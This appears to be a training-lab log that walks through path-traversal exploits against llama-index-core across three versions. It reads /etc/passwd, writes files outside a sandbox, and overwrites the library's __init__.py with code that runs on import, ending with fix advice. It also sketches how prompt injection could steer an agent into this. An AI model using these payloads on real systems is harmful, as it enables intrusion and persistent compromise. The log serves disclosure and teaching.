@@ -1,0 +1,890 @@
+══════════════════════════════════════════════════════
+  GUIDED TRAINING COURSE - AUTO-PILOT MODE
+══════════════════════════════════════════════════════
+
+  Running through all 3 stages automatically...
+  Lessons 1, 3, 4, 5, 6 will run at each stage.
+  Lesson 2 (Path Traversal Read) only runs in Stage 0.
+  Lesson 7 (Custom Sandbox) is hands-on — run it manually.
+
+
+══════════════════════════════════════════════════════
+  STAGE 0: Original Vulnerable (v0.14.19)
+══════════════════════════════════════════════════════
+
+
+[*] Building Stage 0: llama-index-core==0.14.19
+Original Vulnerable - dataset.py AND SimpleKVStore.persist() both exploitable
+[+] Stage 0 ready at http://127.0.0.1:8000
+
+══════════════════════════════════════════════════════════════════════
+  LESSON 1: Baseline Verification
+══════════════════════════════════════════════════════════════════════
+  Objective: Verify the framework is clean and identify what's vulnerable.
+
+[*] Checking sandbox health...
+{
+  "dataset_functions_available": true,
+  "init_integrity": "clean",
+  "llama_version": "0.14.19",
+  "sandbox_dir": "/app/sandbox_data",
+  "stage": 0,
+  "status": "ok"
+}
+
+[*] Checking framework integrity...
+{
+  "clean": true,
+  "exists": true,
+  "file": "/usr/local/lib/python3.11/site-packages/llama_index/core/__init__.py",
+  "markers_found": [],
+  "size_bytes": 4224,
+  "status": "clean"
+}
+
+[*] Checking stage info...
+{
+  "stage": 0,
+  "version": "0.14.19",
+  "dataset_functions_available": true,
+  "SimpleKVStore_available": true,
+  "SimpleKVStore_vulnerable": true,
+  "compromised": false
+}
+
+═══ CURRENT STAGE ANALYSIS ═══
+  Stage: 0 (llama-index-core==0.14.19)
+  Vendor Action: None - vulnerability reported but classified as N/A
+  dataset.py functions: Available
+  SimpleKVStore.persist(): VULNERABLE
+
+  ⚠️  Both attack surfaces available:
+    1. dataset.py path traversal (CWE-22)
+    2. SimpleKVStore.persist() arbitrary write (CWE-22 -> CWE-94)
+
+══════════════════════════════════════════════════════════════════════
+  LESSON 2: Path Traversal Read (Stage 0 Only)
+══════════════════════════════════════════════════════════════════════
+  Objective: Escape the sandbox to read system files via CWE-22.
+
+[*] Attempting to read /etc/passwd via path traversal...
+    Using vulnerable download_llama_dataset path resolution
+
+[PEEK] ../../../../../../etc/passwd
+                                                                                                                                                                                                                                           
+[!] PATH TRAVERSAL DETECTED: '../../../../../../etc/passwd' resolved to '/etc/passwd'                                                                                                                                                      
+[!] Escaped sandbox: /app/sandbox_data                                                                                                                                                                                                     
+root:x:0:0:root:/root:/bin/bash                                                                                                                                                                                                            
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin                                                                                                                                                                                            
+bin:x:2:2:bin:/bin:/usr/sbin/nologin                                                                                                                                                                                                       
+sys:x:3:3:sys:/dev:/usr/sbin/nologin                                                                                                                                                                                                       
+sync:x:4:65534:sync:/bin:/bin/sync                                                                                                                                                                                                         
+games:x:5:60:games:/usr/games:/usr/sbin/nologin                                                                                                                                                                                            
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin                                                                                                                                                                                            
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin                                                                                                                                                                                               
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin                                                                                                                                                                                                
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin                                                                                                                                                                                          
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin                                                                                                                                                                                        
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin                                                                                                                                                                                                 
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin                                                                                                                                                                                       
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin                                                                                                                                                                                       
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin                                                                                                                                                                              
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin                                                                                                                                                                                               
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin                                                                                                                                                                                            
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin                                                                                                                                                                                 
+                                                                                                                                                                                                                                           
+
+┌── [LOW-LEVEL SINK INTERCEPTOR & SYSCALL TRACE] ─────────────────
+│  Vulnerable Sink: download_llama_dataset()
+│  Target Path    : /etc/passwd
+│  Syscall Executed: open("/etc/passwd", O_RDONLY) = 3
+└───────────────────────────────────────────────────────────────────
+
+
+═══ WHAT JUST HAPPENED ═══
+  1. The payload 'peek:../../../../../../etc/passwd' was sent to /chat
+  2. The server used vulnerable path resolution (Path() without .resolve())
+  3. The traversal escaped the sandbox and read a system file
+  4. This demonstrates CWE-22: Path Traversal
+
+  ⚠️  VENDOR RESPONSE NOTE ═══
+  The vendor dismissed this as 'N/A' on Huntr.
+  Days later, they silently DELETED dataset.py (commit 7049c97d).
+  Their commit message: 'remaining cleanup, uv lock bump' - not a security fix.
+
+══════════════════════════════════════════════════════════════════════
+  LESSON 3: Path Traversal Write (ALL Stages) [HANDS-ON]
+══════════════════════════════════════════════════════════════════════
+  This is the interactive lesson. You can customize payloads and explore.
+
+═══ THE VULNERABILITY ═══
+
+  The root cause is in SimpleKVStore.persist() in
+  llama_index/core/storage/kvstore.py
+
+  def persist(self, persist_path: str, fs=None):
+      dirpath = os.path.dirname(persist_path)
+      if not fs.exists(dirpath):
+          fs.makedirs(dirpath)
+      with fs.open(persist_path, 'w') as f:  # <--- NO PATH VALIDATION
+          f.write(json.dumps(self._collections_mappings))
+
+  The function accepts a persist_path parameter and writes to it
+  without any validation. No .resolve(), no is_relative_to(), no anchoring.
+
+═══ HOW AN LLM COULD TRIGGER THIS ═══
+
+  Scenario: An AI agent is given a tool to 'save configuration data'.
+  The LLM is prompted to persist data to a file. An attacker uses
+  indirect prompt injection to manipulate the LLM's output.
+
+  LLM Prompt: 'Save the current configuration to a file.'
+  LLM Response: 'I will save the configuration to
+  ../../../../../../etc/cron.d/malicious_payload'
+
+  The LLM's output is passed directly to SimpleKVStore.persist()
+  without validation. The path traversal succeeds.
+
+  This is NOT a hypothetical attack. This is exactly how AI agents
+  using LlamaIndex tools can be weaponized against their own infrastructure.                                                                                                                                                               
+
+═══ CURRENT STATE ═══
+  Stage: 0 (llama-index-core==0.14.19)
+  dataset.py: Available
+  SimpleKVStore.persist(): VULNERABLE
+  persist() is exploitable in ALL stages.
+
+
+[*] Sending drop action...
+    Path: ../../../../../../tmp/llamaindex_pwned.txt
+    Content: EXPLOIT_SUCCESS
+
+[DROP] SUCCESS: EXPLOIT_SUCCESS -> ../../../../../../tmp/llamaindex_pwned.txt
+[DROP] SimpleKVStore.persist() vulnerability STILL ACTIVE in Stage 0                                                                                                                                                                       
+
+┌── [LOW-LEVEL SINK INTERCEPTOR & SYSCALL TRACE] ─────────────────
+│  Vulnerable Sink: SimpleKVStore.persist()
+│  Target Path    : ../../../../../../tmp/llamaindex_pwned.txt
+│  Syscall Executed: open("../../../../../../tmp/llamaindex_pwned.txt", O_WRONLY|O_CREAT|O_TRUNC) = 3
+│  I/O Operation  : write(3, 'EXPLOIT_SUCCESS...', 15) = 15
+└───────────────────────────────────────────────────────────────────
+
+
+═══ WHAT JUST HAPPENED ═══
+  1. SimpleKVStore.persist() wrote 'EXPLOIT_SUCCESS' to ../../../../../../tmp/llamaindex_pwned.txt
+  2. No path validation was performed - the write succeeded
+  3. This demonstrates CWE-22 -> CWE-94 (arbitrary file write)
+
+  The same vulnerability that wrote to /tmp/ can also write to:
+    - /etc/cron.d/ (persistent scheduled execution)
+    - /usr/local/lib/python3.11/site-packages/ (library overwrite)
+    - /root/.ssh/authorized_keys (SSH persistence)
+    - /etc/ld.so.preload (library injection)
+
+  ⚠️  INCOMPLETE PATCH PROOF ═══
+  Stage 0: dataset.py AND persist() both vulnerable
+  Stage 1: dataset.py deleted but still in PyPI, persist() STILL VULNERABLE
+  Stage 2: logic migrated, persist() STILL VULNERABLE
+  The vendor never fixed SimpleKVStore.persist().
+
+══════════════════════════════════════════════════════════════════════
+  LESSON 4: Framework Overwrite (RCE via Persistence)
+══════════════════════════════════════════════════════════════════════
+  Objective: Overwrite llama_index/core/__init__.py to achieve
+  persistent code execution on every import.
+
+[*] Current: Stage 0 - llama-index-core==0.14.19
+[*] SimpleKVStore.persist() is vulnerable in ALL stages
+[*] Sending nuke action...
+    Target: /usr/local/lib/python3.11/site-packages/llama_index/core/__init__.py
+
+[NUKE] Framework file overwritten: /usr/local/lib/python3.11/site-packages/llama_index/core/__init__.py
+[NUKE] SimpleKVStore.persist() vulnerability STILL ACTIVE in Stage 0                                                                                                                                                                       
+
+┌── [LOW-LEVEL SINK INTERCEPTOR & SYSCALL TRACE] ─────────────────
+│  Vulnerable Sink: SimpleKVStore.persist()
+│  Target Path    : /usr/local/lib/python3.11/site-packages/llama_index/core/__init__.py
+│  Syscall Executed: open("/usr/local/lib/python3.11/site-packages/llama_index/core/__init__.py", O_WRONLY|O_CREAT|O_TRUNC) = 3
+│  I/O Operation  : write(3, 'import os;f=open('/tmp/llamaindex_pwned','w');f.write('RCE_SUCCESS');f.close()...', 78) = 78
+└───────────────────────────────────────────────────────────────────
+
+
+[*] Verifying compromise...
+{
+  "clean": false,
+  "exists": true,
+  "file": "/usr/local/lib/python3.11/site-packages/llama_index/core/__init__.py",
+  "markers_found": [
+    "PERSISTENT COMPROMISE"
+  ],
+  "size_bytes": 113,
+  "status": "compromised"
+}
+
+[✓] FRAMEWORK COMPROMISED!
+    Markers found: ['PERSISTENT COMPROMISE']
+
+═══ WHAT JUST HAPPENED ═══
+  1. SimpleKVStore.persist() wrote attacker-controlled data to __init__.py
+  2. The core library file is now corrupted
+  3. Any subsequent 'import llama_index' triggers the payload
+
+  ⚠️  PERSISTENT COMPROMISE (CVSS Scope Change)
+  This is NOT a transient RCE. The framework source code is modified on disk.
+  All future Python processes importing llama_index will execute the payload.
+
+╔══════════════════════════════════════════════════════════════════╗
+║                     EXPLOIT IMPACT & CVSS SCORE                  ║
+╠══════════════════════════════════════════════════════════════════╣
+║  CVSS Score    : 10.0 CRITICAL
+║  Vector        : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+║  Scope (S)     : CHANGED (S:C) -> Process Boundary Crossed
+║  Confidentiality: HIGH (Arbitrary System File Read)
+║  Integrity      : HIGH (Library & Configuration Overwrite)
+║  Availability   : HIGH (Framework Corruption / Denial of Service)
+╚══════════════════════════════════════════════════════════════════╝
+
+
+══════════════════════════════════════════════════════════════════════
+  LESSON 5: Scope Change Proof (Persistent Compromise)
+══════════════════════════════════════════════════════════════════════
+  Objective: Verify the compromise survives across process boundaries.
+
+[*] Checking current state...
+{
+  "clean": false,
+  "exists": true,
+  "file": "/usr/local/lib/python3.11/site-packages/llama_index/core/__init__.py",
+  "markers_found": [
+    "PERSISTENT COMPROMISE"
+  ],
+  "size_bytes": 113,
+  "status": "compromised"
+}
+
+[✓] SCOPE CHANGE CONFIRMED!
+    The framework source file has been modified on disk.
+    Markers: ['PERSISTENT COMPROMISE']
+
+  This proves the exploit achieved CVSS Scope Change (S:C).
+  The compromise is NOT transient - it persists in the filesystem.
+  Any new Python process importing llama_index will be affected.
+
+  ⚠️  WHY THIS MATTERS ═══
+  The vendor's shadow patch (deleting dataset.py) did NOT fix this.
+  SimpleKVStore.persist() remains vulnerable in ALL versions.
+  Without a CVE, SCA scanners will NOT flag this in enterprise environments.
+
+╔══════════════════════════════════════════════════════════════════╗
+║                     EXPLOIT IMPACT & CVSS SCORE                  ║
+╠══════════════════════════════════════════════════════════════════╣
+║  CVSS Score    : 10.0 CRITICAL
+║  Vector        : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+║  Scope (S)     : CHANGED (S:C) -> Process Boundary Crossed
+║  Confidentiality: HIGH (Arbitrary System File Read)
+║  Integrity      : HIGH (Library & Configuration Overwrite)
+║  Availability   : HIGH (Framework Corruption / Denial of Service)
+╚══════════════════════════════════════════════════════════════════╝
+
+
+══════════════════════════════════════════════════════════════════════
+  LESSON 6: Mitigation Strategies
+══════════════════════════════════════════════════════════════════════
+  Objective: Understand the architectural fix vs. band-aid patches.
+
+═══ PROPOSED FIX: Path Anchoring ═══
+
+  Correct Pattern:
+  from pathlib import Path
+  
+  def get_anchored_path(safe_root: str, user_input: str) -> Path:
+      base_dir = Path(safe_root).resolve()
+      target_path = (base_dir / user_input).resolve()
+      if not target_path.is_relative_to(base_dir):
+          raise PermissionError('Path Traversal Blocked!')
+      return target_path
+
+═══ WHY THE VENDOR'S 'FIX' IS INCOMPLETE ═══
+
+  1. Deleting dataset.py (Stage 1)
+     - Removed the PoC target, did NOT fix root cause
+     - SimpleKVStore.persist() left unprotected
+
+  2. Migrating logic to workflows (Stage 2)
+     - Path sanitization only in workflows sub-package
+     - Core storage module (SimpleKVStore) never patched
+
+  3. No CVE Assignment
+     - SCA scanners show no alerts for affected versions
+     - Enterprise deployments remain blind to the risk
+
+═══ WHAT A REAL FIX REQUIRES ═══
+
+  ✓ Path Anchoring: Mandatory .resolve() + is_relative_to() on ALL file I/O
+  ✓ Type-Safe Sinks: Strict path type validation before any file operation
+  ✓ Centralized I/O: Single audited file utility instead of scattered sinks
+  ✓ CVE Assignment: Public disclosure so SCA scanners can detect vulnerable versions
+
+══════════════════════════════════════════════════════
+  STAGE 1: Shadow Patched (v0.14.20)
+  dataset.py DELETED — persist() STILL VULNERABLE
+══════════════════════════════════════════════════════
+
+
+[*] Building Stage 1: llama-index-core==0.14.20
+Shadow Patched - dataset.py DELETED (commit 7049c97d), SimpleKVStore.persist() STILL vulnerable
+[+] Stage 1 ready at http://127.0.0.1:8000
+
+══════════════════════════════════════════════════════════════════════
+  LESSON 1: Baseline Verification
+══════════════════════════════════════════════════════════════════════
+  Objective: Verify the framework is clean and identify what's vulnerable.
+
+[*] Checking sandbox health...
+{
+  "dataset_functions_available": true,
+  "init_integrity": "clean",
+  "llama_version": "0.14.20",
+  "sandbox_dir": "/app/sandbox_data",
+  "stage": 1,
+  "status": "ok"
+}
+
+[*] Checking framework integrity...
+{
+  "clean": true,
+  "exists": true,
+  "file": "/usr/local/lib/python3.11/site-packages/llama_index/core/__init__.py",
+  "markers_found": [],
+  "size_bytes": 4224,
+  "status": "clean"
+}
+
+[*] Checking stage info...
+{
+  "stage": 1,
+  "version": "0.14.20",
+  "dataset_functions_available": true,
+  "SimpleKVStore_available": true,
+  "SimpleKVStore_vulnerable": true,
+  "compromised": false
+}
+
+═══ CURRENT STAGE ANALYSIS ═══
+  Stage: 1 (llama-index-core==0.14.20)
+  Vendor Action: Deleted PoC target silently under 'cleanup' commit
+  dataset.py functions: Available
+  SimpleKVStore.persist(): VULNERABLE
+
+  ⚠️  Vendor claimed to delete dataset.py but:
+    - The PyPI release STILL contains the vulnerable file
+    - SimpleKVStore.persist() is STILL VULNERABLE
+
+[SKIP] Lesson 2 requires Stage 0 (dataset.py not available in Stage 1)
+
+
+══════════════════════════════════════════════════════════════════════
+  LESSON 3: Path Traversal Write (ALL Stages) [HANDS-ON]
+══════════════════════════════════════════════════════════════════════
+  This is the interactive lesson. You can customize payloads and explore.
+
+═══ THE VULNERABILITY ═══
+
+  The root cause is in SimpleKVStore.persist() in
+  llama_index/core/storage/kvstore.py
+
+  def persist(self, persist_path: str, fs=None):
+      dirpath = os.path.dirname(persist_path)
+      if not fs.exists(dirpath):
+          fs.makedirs(dirpath)
+      with fs.open(persist_path, 'w') as f:  # <--- NO PATH VALIDATION
+          f.write(json.dumps(self._collections_mappings))
+
+  The function accepts a persist_path parameter and writes to it
+  without any validation. No .resolve(), no is_relative_to(), no anchoring.
+
+═══ HOW AN LLM COULD TRIGGER THIS ═══
+
+  Scenario: An AI agent is given a tool to 'save configuration data'.
+  The LLM is prompted to persist data to a file. An attacker uses
+  indirect prompt injection to manipulate the LLM's output.
+
+  LLM Prompt: 'Save the current configuration to a file.'
+  LLM Response: 'I will save the configuration to
+  ../../../../../../etc/cron.d/malicious_payload'
+
+  The LLM's output is passed directly to SimpleKVStore.persist()
+  without validation. The path traversal succeeds.
+
+  This is NOT a hypothetical attack. This is exactly how AI agents
+  using LlamaIndex tools can be weaponized against their own infrastructure.                                                                                                                                                               
+
+═══ CURRENT STATE ═══
+  Stage: 1 (llama-index-core==0.14.20)
+  dataset.py: Available
+  SimpleKVStore.persist(): VULNERABLE
+  persist() is exploitable in ALL stages.
+
+
+[*] Sending drop action...
+    Path: ../../../../../../tmp/llamaindex_pwned.txt
+    Content: EXPLOIT_SUCCESS
+
+[DROP] SUCCESS: EXPLOIT_SUCCESS -> ../../../../../../tmp/llamaindex_pwned.txt
+[DROP] SimpleKVStore.persist() vulnerability STILL ACTIVE in Stage 1                                                                                                                                                                       
+
+┌── [LOW-LEVEL SINK INTERCEPTOR & SYSCALL TRACE] ─────────────────
+│  Vulnerable Sink: SimpleKVStore.persist()
+│  Target Path    : ../../../../../../tmp/llamaindex_pwned.txt
+│  Syscall Executed: open("../../../../../../tmp/llamaindex_pwned.txt", O_WRONLY|O_CREAT|O_TRUNC) = 3
+│  I/O Operation  : write(3, 'EXPLOIT_SUCCESS...', 15) = 15
+└───────────────────────────────────────────────────────────────────
+
+
+═══ WHAT JUST HAPPENED ═══
+  1. SimpleKVStore.persist() wrote 'EXPLOIT_SUCCESS' to ../../../../../../tmp/llamaindex_pwned.txt
+  2. No path validation was performed - the write succeeded
+  3. This demonstrates CWE-22 -> CWE-94 (arbitrary file write)
+
+  The same vulnerability that wrote to /tmp/ can also write to:
+    - /etc/cron.d/ (persistent scheduled execution)
+    - /usr/local/lib/python3.11/site-packages/ (library overwrite)
+    - /root/.ssh/authorized_keys (SSH persistence)
+    - /etc/ld.so.preload (library injection)
+
+  ⚠️  INCOMPLETE PATCH PROOF ═══
+  Stage 0: dataset.py AND persist() both vulnerable
+  Stage 1: dataset.py deleted but still in PyPI, persist() STILL VULNERABLE
+  Stage 2: logic migrated, persist() STILL VULNERABLE
+  The vendor never fixed SimpleKVStore.persist().
+
+══════════════════════════════════════════════════════════════════════
+  LESSON 4: Framework Overwrite (RCE via Persistence)
+══════════════════════════════════════════════════════════════════════
+  Objective: Overwrite llama_index/core/__init__.py to achieve
+  persistent code execution on every import.
+
+[*] Current: Stage 1 - llama-index-core==0.14.20
+[*] SimpleKVStore.persist() is vulnerable in ALL stages
+[*] Sending nuke action...
+    Target: /usr/local/lib/python3.11/site-packages/llama_index/core/__init__.py
+
+[NUKE] Framework file overwritten: /usr/local/lib/python3.11/site-packages/llama_index/core/__init__.py
+[NUKE] SimpleKVStore.persist() vulnerability STILL ACTIVE in Stage 1                                                                                                                                                                       
+
+┌── [LOW-LEVEL SINK INTERCEPTOR & SYSCALL TRACE] ─────────────────
+│  Vulnerable Sink: SimpleKVStore.persist()
+│  Target Path    : /usr/local/lib/python3.11/site-packages/llama_index/core/__init__.py
+│  Syscall Executed: open("/usr/local/lib/python3.11/site-packages/llama_index/core/__init__.py", O_WRONLY|O_CREAT|O_TRUNC) = 3
+│  I/O Operation  : write(3, 'import os;f=open('/tmp/llamaindex_pwned','w');f.write('RCE_SUCCESS');f.close()...', 78) = 78
+└───────────────────────────────────────────────────────────────────
+
+
+[*] Verifying compromise...
+{
+  "clean": false,
+  "exists": true,
+  "file": "/usr/local/lib/python3.11/site-packages/llama_index/core/__init__.py",
+  "markers_found": [
+    "PERSISTENT COMPROMISE"
+  ],
+  "size_bytes": 113,
+  "status": "compromised"
+}
+
+[✓] FRAMEWORK COMPROMISED!
+    Markers found: ['PERSISTENT COMPROMISE']
+
+═══ WHAT JUST HAPPENED ═══
+  1. SimpleKVStore.persist() wrote attacker-controlled data to __init__.py
+  2. The core library file is now corrupted
+  3. Any subsequent 'import llama_index' triggers the payload
+
+  ⚠️  PERSISTENT COMPROMISE (CVSS Scope Change)
+  This is NOT a transient RCE. The framework source code is modified on disk.
+  All future Python processes importing llama_index will execute the payload.
+
+╔══════════════════════════════════════════════════════════════════╗
+║                     EXPLOIT IMPACT & CVSS SCORE                  ║
+╠══════════════════════════════════════════════════════════════════╣
+║  CVSS Score    : 10.0 CRITICAL
+║  Vector        : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+║  Scope (S)     : CHANGED (S:C) -> Process Boundary Crossed
+║  Confidentiality: HIGH (Arbitrary System File Read)
+║  Integrity      : HIGH (Library & Configuration Overwrite)
+║  Availability   : HIGH (Framework Corruption / Denial of Service)
+╚══════════════════════════════════════════════════════════════════╝
+
+
+══════════════════════════════════════════════════════════════════════
+  LESSON 5: Scope Change Proof (Persistent Compromise)
+══════════════════════════════════════════════════════════════════════
+  Objective: Verify the compromise survives across process boundaries.
+
+[*] Checking current state...
+{
+  "clean": false,
+  "exists": true,
+  "file": "/usr/local/lib/python3.11/site-packages/llama_index/core/__init__.py",
+  "markers_found": [
+    "PERSISTENT COMPROMISE"
+  ],
+  "size_bytes": 113,
+  "status": "compromised"
+}
+
+[✓] SCOPE CHANGE CONFIRMED!
+    The framework source file has been modified on disk.
+    Markers: ['PERSISTENT COMPROMISE']
+
+  This proves the exploit achieved CVSS Scope Change (S:C).
+  The compromise is NOT transient - it persists in the filesystem.
+  Any new Python process importing llama_index will be affected.
+
+  ⚠️  WHY THIS MATTERS ═══
+  The vendor's shadow patch (deleting dataset.py) did NOT fix this.
+  SimpleKVStore.persist() remains vulnerable in ALL versions.
+  Without a CVE, SCA scanners will NOT flag this in enterprise environments.
+
+╔══════════════════════════════════════════════════════════════════╗
+║                     EXPLOIT IMPACT & CVSS SCORE                  ║
+╠══════════════════════════════════════════════════════════════════╣
+║  CVSS Score    : 10.0 CRITICAL
+║  Vector        : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+║  Scope (S)     : CHANGED (S:C) -> Process Boundary Crossed
+║  Confidentiality: HIGH (Arbitrary System File Read)
+║  Integrity      : HIGH (Library & Configuration Overwrite)
+║  Availability   : HIGH (Framework Corruption / Denial of Service)
+╚══════════════════════════════════════════════════════════════════╝
+
+
+══════════════════════════════════════════════════════════════════════
+  LESSON 6: Mitigation Strategies
+══════════════════════════════════════════════════════════════════════
+  Objective: Understand the architectural fix vs. band-aid patches.
+
+═══ PROPOSED FIX: Path Anchoring ═══
+
+  Correct Pattern:
+  from pathlib import Path
+  
+  def get_anchored_path(safe_root: str, user_input: str) -> Path:
+      base_dir = Path(safe_root).resolve()
+      target_path = (base_dir / user_input).resolve()
+      if not target_path.is_relative_to(base_dir):
+          raise PermissionError('Path Traversal Blocked!')
+      return target_path
+
+═══ WHY THE VENDOR'S 'FIX' IS INCOMPLETE ═══
+
+  1. Deleting dataset.py (Stage 1)
+     - Removed the PoC target, did NOT fix root cause
+     - SimpleKVStore.persist() left unprotected
+
+  2. Migrating logic to workflows (Stage 2)
+     - Path sanitization only in workflows sub-package
+     - Core storage module (SimpleKVStore) never patched
+
+  3. No CVE Assignment
+     - SCA scanners show no alerts for affected versions
+     - Enterprise deployments remain blind to the risk
+
+═══ WHAT A REAL FIX REQUIRES ═══
+
+  ✓ Path Anchoring: Mandatory .resolve() + is_relative_to() on ALL file I/O
+  ✓ Type-Safe Sinks: Strict path type validation before any file operation
+  ✓ Centralized I/O: Single audited file utility instead of scattered sinks
+  ✓ CVE Assignment: Public disclosure so SCA scanners can detect vulnerable versions
+
+══════════════════════════════════════════════════════
+  STAGE 2: Logic Migrated (v0.14.21+)
+  data_sinks moved — persist() STILL VULNERABLE
+══════════════════════════════════════════════════════
+
+
+[*] Building Stage 2: llama-index-core==0.14.21+
+Logic Migrated - data_sinks moved to workflows sub-package, SimpleKVStore.persist() STILL vulnerable
+[+] Stage 2 ready at http://127.0.0.1:8000
+
+══════════════════════════════════════════════════════════════════════
+  LESSON 1: Baseline Verification
+══════════════════════════════════════════════════════════════════════
+  Objective: Verify the framework is clean and identify what's vulnerable.
+
+[*] Checking sandbox health...
+{
+  "dataset_functions_available": false,
+  "init_integrity": "clean",
+  "llama_version": "0.14.21",
+  "sandbox_dir": "/app/sandbox_data",
+  "stage": 2,
+  "status": "ok"
+}
+
+[*] Checking framework integrity...
+{
+  "clean": true,
+  "exists": true,
+  "file": "/usr/local/lib/python3.11/site-packages/llama_index/core/__init__.py",
+  "markers_found": [],
+  "size_bytes": 4184,
+  "status": "clean"
+}
+
+[*] Checking stage info...
+{
+  "stage": 2,
+  "version": "0.14.21",
+  "dataset_functions_available": false,
+  "SimpleKVStore_available": true,
+  "SimpleKVStore_vulnerable": true,
+  "compromised": false
+}
+
+═══ CURRENT STAGE ANALYSIS ═══
+  Stage: 2 (llama-index-core==0.14.21+)
+  Vendor Action: Migrated logic under 'typo fix' commit - no CVE issued
+  dataset.py functions: DELETED by vendor
+  SimpleKVStore.persist(): VULNERABLE
+
+  ⚠️  Logic migrated but:
+    - SimpleKVStore.persist() is STILL VULNERABLE
+    - The core vulnerability persists in ALL versions
+
+[SKIP] Lesson 2 requires Stage 0 (dataset.py not available in Stage 2)
+
+
+══════════════════════════════════════════════════════════════════════
+  LESSON 3: Path Traversal Write (ALL Stages) [HANDS-ON]
+══════════════════════════════════════════════════════════════════════
+  This is the interactive lesson. You can customize payloads and explore.
+
+═══ THE VULNERABILITY ═══
+
+  The root cause is in SimpleKVStore.persist() in
+  llama_index/core/storage/kvstore.py
+
+  def persist(self, persist_path: str, fs=None):
+      dirpath = os.path.dirname(persist_path)
+      if not fs.exists(dirpath):
+          fs.makedirs(dirpath)
+      with fs.open(persist_path, 'w') as f:  # <--- NO PATH VALIDATION
+          f.write(json.dumps(self._collections_mappings))
+
+  The function accepts a persist_path parameter and writes to it
+  without any validation. No .resolve(), no is_relative_to(), no anchoring.
+
+═══ HOW AN LLM COULD TRIGGER THIS ═══
+
+  Scenario: An AI agent is given a tool to 'save configuration data'.
+  The LLM is prompted to persist data to a file. An attacker uses
+  indirect prompt injection to manipulate the LLM's output.
+
+  LLM Prompt: 'Save the current configuration to a file.'
+  LLM Response: 'I will save the configuration to
+  ../../../../../../etc/cron.d/malicious_payload'
+
+  The LLM's output is passed directly to SimpleKVStore.persist()
+  without validation. The path traversal succeeds.
+
+  This is NOT a hypothetical attack. This is exactly how AI agents
+  using LlamaIndex tools can be weaponized against their own infrastructure.                                                                                                                                                               
+
+═══ CURRENT STATE ═══
+  Stage: 2 (llama-index-core==0.14.21+)
+  dataset.py: DELETED by vendor
+  SimpleKVStore.persist(): VULNERABLE
+  persist() is exploitable in ALL stages.
+
+
+[*] Sending drop action...
+    Path: ../../../../../../tmp/llamaindex_pwned.txt
+    Content: EXPLOIT_SUCCESS
+
+[DROP] SUCCESS: EXPLOIT_SUCCESS -> ../../../../../../tmp/llamaindex_pwned.txt
+[DROP] SimpleKVStore.persist() vulnerability STILL ACTIVE in Stage 2                                                                                                                                                                       
+
+┌── [LOW-LEVEL SINK INTERCEPTOR & SYSCALL TRACE] ─────────────────
+│  Vulnerable Sink: SimpleKVStore.persist()
+│  Target Path    : ../../../../../../tmp/llamaindex_pwned.txt
+│  Syscall Executed: open("../../../../../../tmp/llamaindex_pwned.txt", O_WRONLY|O_CREAT|O_TRUNC) = 3
+│  I/O Operation  : write(3, 'EXPLOIT_SUCCESS...', 15) = 15
+└───────────────────────────────────────────────────────────────────
+
+
+═══ WHAT JUST HAPPENED ═══
+  1. SimpleKVStore.persist() wrote 'EXPLOIT_SUCCESS' to ../../../../../../tmp/llamaindex_pwned.txt
+  2. No path validation was performed - the write succeeded
+  3. This demonstrates CWE-22 -> CWE-94 (arbitrary file write)
+
+  The same vulnerability that wrote to /tmp/ can also write to:
+    - /etc/cron.d/ (persistent scheduled execution)
+    - /usr/local/lib/python3.11/site-packages/ (library overwrite)
+    - /root/.ssh/authorized_keys (SSH persistence)
+    - /etc/ld.so.preload (library injection)
+
+  ⚠️  INCOMPLETE PATCH PROOF ═══
+  Stage 0: dataset.py AND persist() both vulnerable
+  Stage 1: dataset.py deleted, persist() STILL VULNERABLE
+  Stage 2: logic migrated, persist() STILL VULNERABLE
+  The vendor never fixed SimpleKVStore.persist().
+
+══════════════════════════════════════════════════════════════════════
+  LESSON 4: Framework Overwrite (RCE via Persistence)
+══════════════════════════════════════════════════════════════════════
+  Objective: Overwrite llama_index/core/__init__.py to achieve
+  persistent code execution on every import.
+
+[*] Current: Stage 2 - llama-index-core==0.14.21+
+[*] SimpleKVStore.persist() is vulnerable in ALL stages
+[*] Sending nuke action...
+    Target: /usr/local/lib/python3.11/site-packages/llama_index/core/__init__.py
+
+[NUKE] Framework file overwritten: /usr/local/lib/python3.11/site-packages/llama_index/core/__init__.py
+[NUKE] SimpleKVStore.persist() vulnerability STILL ACTIVE in Stage 2                                                                                                                                                                       
+
+┌── [LOW-LEVEL SINK INTERCEPTOR & SYSCALL TRACE] ─────────────────
+│  Vulnerable Sink: SimpleKVStore.persist()
+│  Target Path    : /usr/local/lib/python3.11/site-packages/llama_index/core/__init__.py
+│  Syscall Executed: open("/usr/local/lib/python3.11/site-packages/llama_index/core/__init__.py", O_WRONLY|O_CREAT|O_TRUNC) = 3
+│  I/O Operation  : write(3, 'import os;f=open('/tmp/llamaindex_pwned','w');f.write('RCE_SUCCESS');f.close()...', 78) = 78
+└───────────────────────────────────────────────────────────────────
+
+
+[*] Verifying compromise...
+{
+  "clean": false,
+  "exists": true,
+  "file": "/usr/local/lib/python3.11/site-packages/llama_index/core/__init__.py",
+  "markers_found": [
+    "PERSISTENT COMPROMISE"
+  ],
+  "size_bytes": 113,
+  "status": "compromised"
+}
+
+[✓] FRAMEWORK COMPROMISED!
+    Markers found: ['PERSISTENT COMPROMISE']
+
+═══ WHAT JUST HAPPENED ═══
+  1. SimpleKVStore.persist() wrote attacker-controlled data to __init__.py
+  2. The core library file is now corrupted
